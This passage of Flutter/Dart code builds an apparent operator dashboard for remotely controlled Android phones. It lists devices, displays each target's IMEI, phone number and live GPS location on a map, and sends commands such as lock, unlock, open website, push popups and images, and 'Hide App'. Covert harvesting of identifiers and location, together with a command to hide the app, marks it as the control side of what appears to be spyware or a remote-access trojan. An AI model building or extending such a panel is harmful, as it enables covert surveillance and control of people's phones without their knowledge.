              backgroundColor: Colors.transparent,
              elevation: 0,
              leading: IconButton(
                icon: Container(
                  padding: EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: primaryPink.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: primaryPink.withOpacity(0.3), width: 1),
                  ),
                  child: Icon(
                    Icons.arrow_back,
                    color: accentPink,
                    size: 20,
                  ),
                ),
                onPressed: _navigateBack,
              ),
              actions: [
                if (_selectedDevice != null && _selectedDevice!['online'] == true)
                  AnimatedBuilder(
                    animation: _pulseController,
                    builder: (context, child) {
                      return Container(
                        margin: EdgeInsets.only(right: 8),
                        padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [
                              primaryPink.withOpacity(0.2 + (_pulseController.value * 0.1)),
                              Colors.transparent,
                            ],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                          ),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: primaryPink.withOpacity(0.3)),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 8,
                              height: 8,
                              decoration: BoxDecoration(
                                color: Colors.green,
                                shape: BoxShape.circle,
                                boxShadow: [
                                  BoxShadow(
                                    color: Colors.green.withOpacity(0.5),
                                    blurRadius: 5 + (_pulseController.value * 5),
                                  ),
                                ],
                              ),
                            ),
                            SizedBox(width: 8),
                            Text(
                              'ONLINE',
                              style: TextStyle(
                                color: Colors.green,
                                fontFamily: 'Orbitron',
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      );
                    },
                  ),
                if (!_isShowingDeviceDetail && _selectedDataType == null)
                  IconButton(
                    icon: Icon(Icons.refresh, color: primaryPink),
                    onPressed: _fetchDevices,
                  ),
              ],
            ),
            body: _isLoading
                ? Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        CircularProgressIndicator(
                          valueColor: AlwaysStoppedAnimation<Color>(primaryPink),
                          strokeWidth: 3,
                        ),
                        SizedBox(height: 16),
                        Text(
                          'LOADING DEVICES...',
                          style: TextStyle(
                            color: lightPink,
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                            letterSpacing: 2,
                          ),
                        ),
                      ],
                    ),
                  )
                : _isShowingDeviceDetail
                    ? _buildEnhancedDeviceDetailView()
                    : _selectedDataType != null
                        ? _buildDeviceDataView()
                        : _buildDevicesView(),
          ),
        );
      },
    );
  }

  Widget _buildDevicesView() {
    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.devices_other,
              size: 80,
              color: primaryPink.withOpacity(0.3),
            ),
            SizedBox(height: 16),
            Text(
              'No Devices Found',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontSize: 18,
              ),
            ),
            SizedBox(height: 8),
            Text(
              'Waiting for devices to connect...',
              style: TextStyle(
                color: lightPink,
                fontFamily: 'ShareTechMono',
              ),
            ),
          ],
        ),
      );
    }

    return ListView.builder(
      padding: EdgeInsets.all(16),
      itemCount: _devices.length,
      itemBuilder: (context, index) {
        final device = _devices[index];
        final isOnline = device['online'] == true;

        return GestureDetector(
          onTap: () => _showDeviceDetail(device),
          child: AnimatedContainer(
            duration: Duration(milliseconds: 300),
            margin: EdgeInsets.only(bottom: 16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  cardDark,
                  isOnline ? primaryPink.withOpacity(0.1) : accentGrey.withOpacity(0.05),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: isOnline ? primaryPink : accentGrey.withOpacity(0.3),
                width: isOnline ? 2 : 1,
              ),
              boxShadow: [
                if (isOnline)
                  BoxShadow(
                    color: primaryPink.withOpacity(0.3),
                    blurRadius: 15,
                    spreadRadius: 2,
                  ),
              ],
            ),
            child: Padding(
              padding: EdgeInsets.all(20),
              child: Column(
                children: [
                  Row(
                    children: [
                      Container(
                        padding: EdgeInsets.all(12),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [primaryPink, accentPink],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                          ),
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          Icons.phone_android,
                          color: primaryWhite,
                        ),
                      ),
                      SizedBox(width: 16),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              device['model'] ?? 'Unknown Device',
                              style: TextStyle(
                                color: primaryWhite,
                                fontFamily: 'Orbitron',
                                fontWeight: FontWeight.bold,
                                fontSize: 16,
                              ),
                            ),
                            SizedBox(height: 4),
                            Row(
                              children: [
                                Container(
                                  width: 8,
                                  height: 8,
                                  decoration: BoxDecoration(
                                    color: isOnline ? Colors.green : accentGrey,
                                    shape: BoxShape.circle,
                                    boxShadow: [
                                      if (isOnline)
                                        BoxShadow(
                                          color: Colors.green.withOpacity(0.5),
                                          blurRadius: 5,
                                        ),
                                    ],
                                  ),
                                ),
                                SizedBox(width: 8),
                                Text(
                                  isOnline ? 'ACTIVE' : 'OFFLINE',
                                  style: TextStyle(
                                    color: isOnline ? Colors.green : accentGrey,
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 12,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                                if (device['last_seen'] != null) ...[
                                  SizedBox(width: 8),
                                  Text(
                                    '• ${_formatDateTime(device['last_seen'])}',
                                    style: TextStyle(
                                      color: accentGrey,
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 10,
                                    ),
                                  ),
                                ],
                              ],
                            ),
                          ],
                        ),
                      ),
                      Container(
                        padding: EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          color: primaryPink.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Icon(
                          Icons.chevron_right,
                          color: primaryPink,
                        ),
                      ),
                    ],
                  ),
                  SizedBox(height: 16),
                  Container(
                    height: 1,
                    color: primaryPink.withOpacity(0.2),
                  ),
                  SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    children: [
                      _buildDeviceInfoChip(
                        icon: Icons.battery_charging_full,
                        label: 'Battery',
                        value: '${device['battery'] ?? 0}%',
                      ),
                      _buildDeviceInfoChip(
                        icon: Icons.sim_card,
                        label: 'SIM',
                        value: device['sim_operator'] ?? 'Unknown',
                      ),
                      _buildDeviceInfoChip(
                        icon: Icons.android,
                        label: 'Android',
                        value: '${device['android_version'] ?? '?'}',
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildDeviceInfoChip({required IconData icon, required String label, required String value}) {
    return Container(
      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: primaryPink.withOpacity(0.1),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: primaryPink.withOpacity(0.3), width: 1),
      ),
      child: Row(
        children: [
          Icon(icon, color: primaryPink, size: 14),
          SizedBox(width: 4),
          Text(
            value.length > 8 ? '${value.substring(0, 8)}...' : value,
            style: TextStyle(
              color: lightPink,
              fontFamily: 'ShareTechMono',
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEnhancedDeviceDetailView() {
    if (_selectedDevice == null) return SizedBox();
    final device = _selectedDevice!;
    final isOnline = device['online'] == true;
    final deviceId = device['device_id'];

    return Column(
      children: [
        Container(
          width: double.infinity,
          padding: EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [primaryPink.withOpacity(0.2), Colors.transparent],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
          child: Row(
            children: [
              Stack(
                children: [
                  Container(
                    padding: EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [primaryPink, accentPink],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: primaryPink.withOpacity(0.5),
                          blurRadius: 20,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: Icon(
                      Icons.phone_android,
                      size: 30,
                      color: primaryWhite,
                    ),
                  ),
                  if (isOnline)
                    Positioned(
                      right: 0,
                      bottom: 0,
                      child: Container(
                        width: 12,
                        height: 12,
                        decoration: BoxDecoration(
                          color: Colors.green,
                          shape: BoxShape.circle,
                          border: Border.all(color: primaryDark, width: 2),
                        ),
                      ),
                    ),
                ],
              ),
              SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      device['model'] ?? 'Unknown Device',
                      style: TextStyle(
                        color: primaryWhite,
                        fontFamily: 'Orbitron',
                        fontSize: 18,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    SizedBox(height: 4),
                    Row(
                      children: [
                        Icon(Icons.battery_charging_full, color: Colors.green, size: 14),
                        SizedBox(width: 4),
                        Text(
                          '${device['battery'] ?? 0}%',
                          style: TextStyle(
                            color: Colors.green,
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                          ),
                        ),
                        SizedBox(width: 12),
                        Icon(Icons.signal_cellular_alt, color: lightPink, size: 14),
                        SizedBox(width: 4),
                        Text(
                          device['sim_operator'] ?? 'Unknown',
                          style: TextStyle(
                            color: lightPink,
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        
        Container(
          margin: EdgeInsets.symmetric(horizontal: 16),
          padding: EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(30),
            border: Border.all(color: primaryPink.withOpacity(0.3), width: 1),
          ),
          child: Row(
            children: [
              _buildModernTabButton(0, Icons.info_outline, Icons.info, 'INFO'),
              _buildModernTabButton(1, Icons.settings_outlined, Icons.settings, 'CONTROL'),
              _buildModernTabButton(2, Icons.data_usage, Icons.data_usage, 'DATA'),
            ],
          ),
        ),
        
        SizedBox(height: 16),
        
        Expanded(
          child: IndexedStack(
            index: _selectedTabIndex,
            children: [
              _buildEnhancedInfoTab(device),
              _buildEnhancedControlTab(deviceId, isOnline),
              _buildEnhancedDataTab(deviceId, isOnline),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildModernTabButton(int index, IconData iconOutlined, IconData iconFilled, String label) {
    final isSelected = _selectedTabIndex == index;
    
    return Expanded(
      child: GestureDetector(
        onTap: () {
          setState(() {
            _selectedTabIndex = index;
          });
        },
        child: AnimatedContainer(
          duration: Duration(milliseconds: 200),
          padding: EdgeInsets.symmetric(vertical: 10),
          decoration: BoxDecoration(
            gradient: isSelected
                ? LinearGradient(
                    colors: [primaryPink, accentPink],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  )
                : null,
            borderRadius: BorderRadius.circular(30),
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                isSelected ? iconFilled : iconOutlined,
                color: isSelected ? primaryWhite : lightPink,
                size: 18,
              ),
              if (isSelected) ...[
                SizedBox(width: 6),
                Text(
                  label,
                  style: TextStyle(
                    color: primaryWhite,
                    fontFamily: 'Orbitron',
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildEnhancedInfoTab(Map<String, dynamic> device) {
    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          Row(
            children: [
              Expanded(
                child: _buildQuickStatCard(
                  icon: Icons.memory,
                  label: 'RAM',
                  value: _formatBytes(_deviceInfo['ram_total'] ?? device['ram_total'] ?? 0),
                  color: Colors.blue,
                ),
              ),
              SizedBox(width: 12),
              Expanded(
                child: _buildQuickStatCard(
                  icon: Icons.storage,
                  label: 'Storage',
                  value: _formatBytes(_deviceInfo['storage_total'] ?? device['storage_total'] ?? 0),
                  color: Colors.orange,
                ),
              ),
            ],
          ),
          SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: _buildQuickStatCard(
                  icon: Icons.speed,
                  label: 'CPU Cores',
                  value: (_deviceInfo['available_processors'] ?? device['available_processors'] ?? 0).toString(),
                  color: Colors.purple,
                ),
              ),
              SizedBox(width: 12),
              Expanded(
                child: _buildQuickStatCard(
                  icon: Icons.phone_android,
                  label: 'Screen',
                  value: '${_deviceInfo['screen_width'] ?? device['screen_width'] ?? 0}x${_deviceInfo['screen_height'] ?? device['screen_height'] ?? 0}',
                  color: Colors.teal,
                ),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedInfoSection(
            title: 'DEVICE INFORMATION',
            icon: Icons.phone_android,
            children: [
              _buildInfoRow('Device ID', device['device_id'] ?? 'N/A', isMonospace: true),
              _buildInfoRow('Model', _deviceInfo['model'] ?? device['model'] ?? 'Unknown'),
              _buildInfoRow('Manufacturer', _deviceInfo['manufacturer'] ?? device['manufacturer'] ?? 'Unknown'),
              _buildInfoRow('Android Version', _deviceInfo['android_version'] ?? device['android_version'] ?? 'Unknown'),
              _buildInfoRow('Build ID', _deviceInfo['build_id'] ?? device['build_id'] ?? 'N/A'),
            ],
          ),
          
          SizedBox(height: 12),
          
          _buildEnhancedInfoSection(
            title: 'NETWORK INFORMATION',
            icon: Icons.network_cell,
            children: [
              _buildInfoRow('IMEI', _deviceInfo['imei'] ?? device['imei'] ?? 'N/A', isMonospace: true),
              _buildInfoRow('Phone Number', _deviceInfo['phone_number'] ?? device['phone_number'] ?? 'N/A'),
              _buildInfoRow('SIM Operator', _deviceInfo['sim_operator'] ?? device['sim_operator'] ?? 'Unknown'),
              _buildInfoRow('Network Type', _deviceInfo['network_type_name'] ?? device['network_type_name'] ?? 'Unknown'),
            ],
          ),
          
          SizedBox(height: 12),
          
          _buildEnhancedInfoSection(
            title: 'SYSTEM INFORMATION',
            icon: Icons.settings_applications,
            children: [
              _buildInfoRow('Timezone', _deviceInfo['timezone'] ?? device['timezone'] ?? 'Unknown'),
              _buildInfoRow('Language', _deviceInfo['language'] ?? device['language'] ?? 'Unknown'),
              _buildInfoRow('Country', _deviceInfo['country'] ?? device['country'] ?? 'Unknown'),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildQuickStatCard({required IconData icon, required String label, required String value, required Color color}) {
    return Container(
      padding: EdgeInsets.all(12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, color.withOpacity(0.1)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Column(
        children: [
          Icon(icon, color: color, size: 24),
          SizedBox(height: 8),
          Text(
            value,
            style: TextStyle(
              color: primaryWhite,
              fontFamily: 'Orbitron',
              fontSize: 14,
              fontWeight: FontWeight.bold,
            ),
          ),
          Text(
            label,
            style: TextStyle(
              color: lightPink,
              fontFamily: 'ShareTechMono',
              fontSize: 10,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEnhancedInfoSection({required String title, required IconData icon, required List<Widget> children}) {
    return Container(
      width: double.infinity,
      padding: EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, primaryPink.withOpacity(0.1)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: primaryPink.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: primaryPink.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: primaryPink, size: 16),
              ),
              SizedBox(width: 8),
              Text(
                title,
                style: TextStyle(
                  color: primaryPink,
                  fontFamily: 'Orbitron',
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                ),
              ),
            ],
          ),
          SizedBox(height: 12),
          ...children,
        ],
      ),
    );
  }

  Widget _buildEnhancedControlTab(String deviceId, bool isOnline) {
    if (!isOnline) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.wifi_off, size: 64, color: accentGrey),
            SizedBox(height: 16),
            Text(
              'Device Offline',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontSize: 18,
              ),
            ),
            SizedBox(height: 8),
            Text(
              'Commands are unavailable while device is offline',
              style: TextStyle(
                color: lightPink,
                fontFamily: 'ShareTechMono',
              ),
            ),
          ],
        ),
      );
    }

    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          _buildEnhancedControlCategory(
            title: 'SCREEN CONTROLS',
            icon: Icons.lock_outline,
            color: Colors.orange,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Lock Device',
                icon: Icons.lock,
                color: Colors.orange,
                onPressed: () => _sendCommand(deviceId, 'lock'),
              ),
              _buildEnhancedControlButton(
                label: 'Unlock Device',
                icon: Icons.lock_open,
                color: Colors.green,
                onPressed: () => _sendCommand(deviceId, 'unlock'),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'FLASHLIGHT',
            icon: Icons.flash_on,
            color: Colors.yellow,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Flashlight ON',
                icon: Icons.flash_on,
                color: Colors.yellow,
                onPressed: () => _sendCommand(deviceId, 'flashlight_on'),
              ),
              _buildEnhancedControlButton(
                label: 'Flashlight OFF',
                icon: Icons.flash_off,
                color: Colors.grey,
                onPressed: () => _sendCommand(deviceId, 'flashlight_off'),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'MUSIC',
            icon: Icons.music_note,
            color: Colors.blue,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Play Music',
                icon: Icons.music_note,
                color: Colors.blue,
                onPressed: () => _showMusicUrlDialog(deviceId),
              ),
              _buildEnhancedControlButton(
                label: 'Stop Music',
                icon: Icons.stop,
                color: Colors.red,
                onPressed: () => _sendCommand(deviceId, 'stop_music'),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'APP MANAGEMENT',
            icon: Icons.apps,
            color: Colors.purple,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Hide App',
                icon: Icons.visibility_off,
                color: Colors.purple,
                onPressed: () => _sendCommand(deviceId, 'hide_app'),
              ),
              _buildEnhancedControlButton(
                label: 'Show App',
                icon: Icons.visibility,
                color: Colors.teal,
                onPressed: () => _sendCommand(deviceId, 'show_app'),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'WEB & BROWSER',
            icon: Icons.public,
            color: Colors.blue,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Open Website',
                icon: Icons.open_in_browser,
                color: Colors.blue,
                onPressed: () => _showOpenWebDialog(deviceId),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'NOTIFICATIONS & POPUPS',
            icon: Icons.notifications,
            color: Colors.orange,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Show Notification',
                icon: Icons.notifications,
                color: Colors.orange,
                onPressed: () => _showNotificationDialog(deviceId),
              ),
              _buildEnhancedControlButton(
                label: 'Show Popup',
                icon: Icons.message,
                color: Colors.purple,
                onPressed: () => _showPopupDialog(deviceId),
              ),
            ],
          ),
          
          SizedBox(height: 16),
          
          _buildEnhancedControlCategory(
            title: 'FLOATING IMAGES',
            icon: Icons.image,
            color: Colors.pink,
            buttons: [
              _buildEnhancedControlButton(
                label: 'Show Images',
                icon: Icons.add_photo_alternate,
                color: Colors.pink,
                onPressed: () => _showFloatingImagesDialog(deviceId),
              ),
              _buildEnhancedControlButton(
                label: 'Clear Images',
                icon: Icons.clear_all,
                color: Colors.red,
                onPressed: () => _sendCommand(deviceId, 'clear_floating_images'),
              ),
            ],
          ),
          
          if (_commandResponse != null) ...[
            SizedBox(height: 16),
            Container(
              padding: EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [Colors.green.withOpacity(0.2), Colors.transparent],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.green, width: 1),
              ),
              child: Row(
                children: [
                  Icon(Icons.check_circle, color: Colors.green, size: 20),
                  SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      _commandResponse!,
                      style: TextStyle(
                        color: primaryWhite,
                        fontFamily: 'ShareTechMono',
                        fontSize: 12,
                      ),
                    ),
                  ),
                  IconButton(
                    icon: Icon(Icons.close, color: accentGrey, size: 16),
                    onPressed: () => setState(() => _commandResponse = null),
                    padding: EdgeInsets.zero,
                    constraints: BoxConstraints(),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildEnhancedControlCategory({required String title, required IconData icon, required Color color, required List<Widget> buttons}) {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardDark, color.withOpacity(0.1)],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: EdgeInsets.all(16),
            child: Row(
              children: [
                Container(
                  padding: EdgeInsets.all(6),
                  decoration: BoxDecoration(
                    color: color.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Icon(icon, color: color, size: 16),
                ),
                SizedBox(width: 8),
                Text(
                  title,
                  style: TextStyle(
                    color: color,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                  ),
                ),
              ],
            ),
          ),
          ...buttons,
        ],
      ),
    );
  }

  Widget _buildEnhancedControlButton({required String label, required IconData icon, required Color color, required VoidCallback onPressed}) {
    return InkWell(
      onTap: onPressed,
      child: Container(
        padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          border: Border(
            top: BorderSide(color: color.withOpacity(0.2), width: 0.5),
          ),
        ),
        child: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: color.withOpacity(0.2),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(icon, color: color, size: 18),
            ),
            SizedBox(width: 12),
            Expanded(
              child: Text(
                label,
                style: TextStyle(
                  color: primaryWhite,
                  fontFamily: 'ShareTechMono',
                  fontSize: 14,
                ),
              ),
            ),
            Icon(Icons.arrow_forward_ios, color: color, size: 14),
          ],
        ),
      ),
    );
  }

  Widget _buildEnhancedDataTab(String deviceId, bool isOnline) {
    return SingleChildScrollView(
      padding: EdgeInsets.all(16),
      child: Column(
        children: [
          Container(
            width: double.infinity,
            margin: EdgeInsets.only(bottom: 16),
            padding: EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [cardDark, Colors.blue.withOpacity(0.1)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: Colors.blue.withOpacity(0.2),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(Icons.location_on, color: Colors.blue, size: 20),
                        ),
                        SizedBox(width: 12),
                        Text(
                          'LIVE LOCATION',
                          style: TextStyle(
                            color: Colors.blue,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                            fontSize: 16,
                          ),
                        ),
                      ],
                    ),
                    if (isOnline)
                      AnimatedBuilder(
                        animation: _pulseController,
                        builder: (context, child) {
                          return Container(
                            padding: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                            decoration: BoxDecoration(
                              color: Colors.green.withOpacity(0.2 + (_pulseController.value * 0.1)),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: Colors.green, width: 1),
                            ),
                            child: Row(
                              children: [
                                Container(
                                  width: 6,
                                  height: 6,
                                  decoration: BoxDecoration(
                                    color: Colors.green,
                                    shape: BoxShape.circle,
                                  ),
                                ),
                                SizedBox(width: 4),
                                Text(
                                  'LIVE',
                                  style: TextStyle(
                                    color: Colors.green,
                                    fontFamily: 'Orbitron',
                                    fontSize: 10,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ],
                            ),
                          );
                        },
                      ),
                  ],
                ),
                SizedBox(height: 16),
                if (_lastLocation != null) ...[
                  Container(
                    height: 280,
                    width: double.infinity,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.blue.withOpacity(0.3), width: 1),
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: FlutterMap(
                        options: MapOptions(
                          initialCenter: LatLng(_lastLocation!['lat'], _lastLocation!['lng']),
                          initialZoom: 15,
                        ),
                        children: [
                          TileLayer(
                            urlTemplate: 'https://tile.openstreetmap.org/{z}/{x}/{y}.png',
                            userAgentPackageName: 'com.nxt.app',
                            maxZoom: 19,
                          ),
                          MarkerLayer(
                            markers: [
                              Marker(
                                point: LatLng(_lastLocation!['lat'], _lastLocation!['lng']),
                                width: 40,
                                height: 40,
                                child: const Icon(
                                  Icons.location_on,
                                  color: Colors.red,
                                  size: 40,
                                ),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ),
                  SizedBox(height: 16),
                  Row(
                    children: [
                      Expanded(
                        child: _buildLocationDetail(
                          icon: Icons.my_location,
                          label: 'Latitude',
                          value: _lastLocation!['lat'].toStringAsFixed(6),
                        ),
                      ),
                      SizedBox(width: 12),
                      Expanded(
                        child: _buildLocationDetail(
                          icon: Icons.my_location,
                          label: 'Longitude',
                          value: _lastLocation!['lng'].toStringAsFixed(6),
                        ),
                      ),
                    ],
                  ),
                  SizedBox(height: 12),
                  Row(
                    children: [
                      Expanded(
                        child: _buildLocationDetail(
                          icon: Icons.satellite,
                          label: 'Accuracy',
                          value: '±${_lastLocation!['accuracy']}m',
                        ),
                      ),
                      SizedBox(width: 12),
                      Expanded(
                        child: _buildLocationDetail(
                          icon: Icons.speed,
                          label: 'Speed',
                          value: '${_lastLocation!['speed'] ?? 0} m/s',
                        ),
                      ),
                    ],
                  ),
                  SizedBox(height: 12),
                  _buildLocationDetail(
                    icon: Icons.access_time,
                    label: 'Last Updated',
                    value: _formatEpochTime(_lastLocation!['time']),
                  ),
                ] else ...[
                  Center(
                    child: Column(
                      children: [
                        Icon(Icons.location_off, size: 40, color: accentGrey),
                        SizedBox(height: 8),
                        Text(
                          'No location data available',
                          style: TextStyle(
                            color: lightPink,
                            fontFamily: 'ShareTechMono',
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
                SizedBox(height: 12),
                ElevatedButton(
                  onPressed: isOnline ? () => _fetchLocations(deviceId) : null,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.blue,
                    foregroundColor: primaryWhite,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    minimumSize: Size(double.infinity, 40),
                  ),
                  child: Text('REFRESH LOCATION'),
                ),
              ],
            ),
          ),
          
          Container(
            width: double.infinity,
            padding: EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [cardDark, Colors.green.withOpacity(0.1)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.green.withOpacity(0.3), width: 1),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: Colors.green.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.battery_charging_full, color: Colors.green, size: 20),
                    ),
                    SizedBox(width: 12),
                    Text(
                      'BATTERY STATUS',
                      style: TextStyle(
                        color: Colors.green,
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 16,
                      ),
                    ),
                  ],
                ),
                SizedBox(height: 16),
                if (_batteryInfo.isNotEmpty) ...[
                  Row(
                    children: [
                      Expanded(
                        flex: 2,
                        child: Stack(
                          alignment: Alignment.center,
                          children: [
                            SizedBox(
                              width: 80,
                              height: 80,
                              child: CircularProgressIndicator(
                                value: (_batteryInfo['battery'] ?? 0) / 100,
                                strokeWidth: 6,
                                backgroundColor: cardDark,
                                valueColor: AlwaysStoppedAnimation<Color>(
                                  (_batteryInfo['battery'] ?? 0) > 20 ? Colors.green : Colors.red,
                                ),
                              ),
                            ),
                            Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Text(
                                  '${_batteryInfo['battery'] ?? 0}%',
                                  style: TextStyle(
                                    color: primaryWhite,
                                    fontFamily: 'Orbitron',
                                    fontSize: 16,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                                Text(
                                  _batteryInfo['charging'] == true ? '⚡' : '',
                                  style: TextStyle(
